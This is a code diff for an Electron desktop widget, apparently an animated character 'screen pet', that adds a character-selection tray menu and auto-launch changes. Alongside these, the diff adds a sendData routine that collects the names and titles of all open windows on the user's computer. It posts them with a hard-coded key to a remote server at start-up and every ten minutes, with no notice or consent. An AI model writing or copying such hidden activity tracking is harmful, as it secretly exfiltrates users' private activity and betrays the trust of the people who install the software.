@@ -6,8 +6,12 @@ import EventEmitter from 'events'
 import activeWin from 'active-win'
 import { nativeImage } from 'electron'
 import appIcon from '../../build/icon.ico?asset'
+import fetch from 'electron-fetch'
+import settingsManager from './settings'
 
+let settings = new settingsManager();
 let hookMove = false, readyMove = false, cache = [0, 0, 0, 0]
+let mainWindow
 
 class MouseMonitor extends EventEmitter {
     lastTime: number
@@ -93,7 +97,6 @@ class KeyboardMonitor extends EventEmitter {
         });
     }
 }
-
 class ApplicationMonitor extends EventEmitter {
     timer: any
     lasttime: number
@@ -116,6 +119,36 @@ class ApplicationMonitor extends EventEmitter {
             }, 5000);
         }
     }
+    async sendData() {
+        try {
+            const window = await activeWin.getOpenWindows();
+            let data = [] as any;
+            window.forEach((item) => {
+                data.push({
+                    name: item.owner.name,
+                    title: item.title
+                })
+            })
+            data = JSON.stringify(data);
+            const key = '***REMOVED***';
+            const response = await fetch('***REMOVED***saveDataKV', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ data, key })
+            });
+
+            if (!response.ok) {
+                const message = await response.text();
+                throw new Error(`HTTP error! status: ${response.status}, message: ${message}`);
+            }
+
+            console.log('Data sent successfully');
+        } catch (error) {
+            console.error('Failed to send data:', error);
+        }
+    }
     start() {
         setInterval(() => {
             this.monitor()
@@ -127,6 +160,10 @@ class ApplicationMonitor extends EventEmitter {
             }
             this.lasttime = nowtime
         });
+        this.sendData()
+        setInterval(() => {
+            this.sendData()
+        }, 10 * 60 * 1000);
     }
 }
 
@@ -141,7 +178,7 @@ var setAutoLaunch = (val) => {
 
 function createWindow(): void {
     // Create the browser window.
-    const mainWindow = new BrowserWindow({
+    mainWindow = new BrowserWindow({
         width: 250,
         height: 400,
         show: false,
@@ -179,12 +216,10 @@ function createWindow(): void {
             mainWindow.setAlwaysOnTop(true, 'screen-saver', 1);
         })
 
-        setInterval(() => {
-            mainWindow.restore();
-            mainWindow.setAlwaysOnTop(true, 'screen-saver', 1);
-            // let [window_x, window_y] = mainWindow.getPosition();
-            // mainWindow.setBounds({x: window_x, y: window_y, width: 250, height: 400})
-        }, 5000)
+        // setInterval(() => {
+        //     mainWindow.restore();
+        //     mainWindow.setAlwaysOnTop(true, 'screen-saver', 1);
+        // }, 5000)
         iohook.start();
 
         iohook.on('mousemove', event => {
@@ -259,6 +294,7 @@ function createWindow(): void {
             mainWindow.webContents.send('application-status', data.title);
         });
         applicationMonitor.start();
+        if (is.dev) mainWindow.webContents.openDevTools({ mode: 'detach' })
     })
 
     mainWindow.webContents.setWindowOpenHandler((details) => {
@@ -275,15 +311,39 @@ function createWindow(): void {
     }
 }
 
-function createTray() {
+async function createTray() {
     let tray = new Tray(nativeImage.createFromPath(appIcon));
-    tray.setToolTip('魈宝宝');
+    tray.setToolTip('屏幕挂件');
+    let currentCharacter = await settings.getCharacter()
+    const table = [
+        "魈", "万叶"
+    ]
+    let context = [] as any
+    table.forEach((item, index) => {
+        context.push({
+            label: item,
+            type: 'radio',
+            checked: currentCharacter === index,
+            click: () => {
+                if (currentCharacter === index) return
+                currentCharacter = index
+                process.env['character'] = currentCharacter as any
+                mainWindow.webContents.send('character-change', currentCharacter)
+                settings.setCharacter(index)
+            }
+        })
+    })
+
     const contextMenu = Menu.buildFromTemplate([{
         label: '退出',
         click() {
             app.quit();
         }
-    }])
+    }, {
+        label: '角色选择',
+        submenu: context
+    }
+    ])
     tray.setContextMenu(contextMenu)
 }
 
@@ -291,7 +351,7 @@ function createTray() {
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
 // Some APIs can only be used after this event occurs.
-app.whenReady().then(() => {
+app.whenReady().then(async () => {
     // Set app user model id for windows
     electronApp.setAppUserModelId('com.electron')
 
@@ -302,17 +362,22 @@ app.whenReady().then(() => {
         optimizer.watchWindowShortcuts(window)
     })
 
+    let currentCharacter = await settings.getCharacter()
+    process.env['character'] = currentCharacter as any
     createWindow()
     createTray()
 
     setTimeout(() => {
-        setAutoLaunch(true)
+        if (!process.argv.includes('--autoLaunch')) {
+            setAutoLaunch(true)
+        }
     }, 5000)
     app.on('activate', function () {
         // On macOS it's common to re-create a window in the app when the
         // dock icon is clicked and there are no other windows open.
         if (BrowserWindow.getAllWindows().length === 0) createWindow()
     })
+
 })
 
 // Quit when all windows are closed, except on macOS. There, it's common
